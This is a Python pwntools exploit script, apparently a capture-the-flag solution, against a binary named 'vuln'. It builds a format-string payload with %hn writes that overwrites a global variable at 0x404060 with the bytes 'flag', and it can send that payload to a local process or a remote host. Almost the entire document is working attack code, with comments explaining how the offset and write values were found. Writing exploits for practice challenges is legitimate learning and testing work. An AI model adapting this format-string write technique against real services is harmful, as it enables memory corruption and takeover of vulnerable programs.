#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

# PIE is off - address in .bss is static
# this challenge can be solved via rip smash
# but the intended version is this
SUS_ADDR = 0x404060

TARGET_VAL_LOW = 27750 #0x67616c66
TARGET_VAL_HIGH = 26465

BUF_OFFSET = 14 # trial and error in gdb AAAAAAA.%14$p prints 0x4141414141...

# writing the whole dword at once is too big and annoying and slow, so we'll do it one word at a time
# so the bottom half of the dword is easy - just write 0x6c66 bytes first
# for the second half, we need to calculuate exactly where to land (VAL_HIGH - VAL_LOW). we add 0x10000 to ensure
# we overflow into a positive number if the distance is negative.
payload = f"%0{TARGET_VAL_LOW}x".encode('latin1') + b"%18$hn" + f"%0{TARGET_VAL_HIGH - TARGET_VAL_LOW + 0x10000}x".encode('latin1') + b"%19$hn"
payload += b'....' # need to pad to a full 3rd word
payload += p64(SUS_ADDR) + p64(SUS_ADDR + 2)


io = start()

io.sendline(payload)


io.interactive()

